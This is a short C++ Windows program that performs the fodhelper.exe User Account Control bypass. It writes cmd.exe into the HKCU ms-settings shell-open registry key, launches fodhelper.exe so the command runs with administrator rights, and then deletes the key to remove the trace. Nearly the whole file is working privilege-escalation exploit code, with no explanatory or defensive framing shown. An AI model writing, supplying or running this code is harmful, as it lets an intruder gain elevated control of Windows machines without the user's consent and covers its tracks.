#include <windows.h>
#include <shellapi.h>
#include <iostream>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")


bool IsElevated() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return false;

    TOKEN_ELEVATION elevation;
    DWORD dwSize;
    bool bIsElevated = false;

    if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
        bIsElevated = elevation.TokenIsElevated;
    }

    CloseHandle(hToken);
    return bIsElevated;
}

LONG DeleteRegKeyRecursive(HKEY hRoot, const wchar_t* subkey) {
    return RegDeleteTreeW(hRoot, subkey);
}

int main() {

    HKEY hKey;
    const wchar_t* baseKey = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";

    if (RegCreateKeyExW(HKEY_CURRENT_USER, baseKey, 0, NULL, REG_OPTION_NON_VOLATILE,
        KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        return 1;
    }

    const wchar_t* cmd = L"cmd.exe";
    RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)cmd, (wcslen(cmd) + 1) * sizeof(wchar_t));

    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, NULL, 0);

    RegCloseKey(hKey);

    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"open";
    sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
    sei.nShow = SW_SHOW;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;

    if (ShellExecuteExW(&sei)) {
        WaitForSingleObject(sei.hProcess, 8000);
        CloseHandle(sei.hProcess);
    }

    DeleteRegKeyRecursive(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");

    Sleep(1200);

    if (IsElevated()) {
        ShellExecuteW(NULL, L"open", L"cmd.exe", NULL, NULL, SW_SHOW);
    }

    return 0;
}
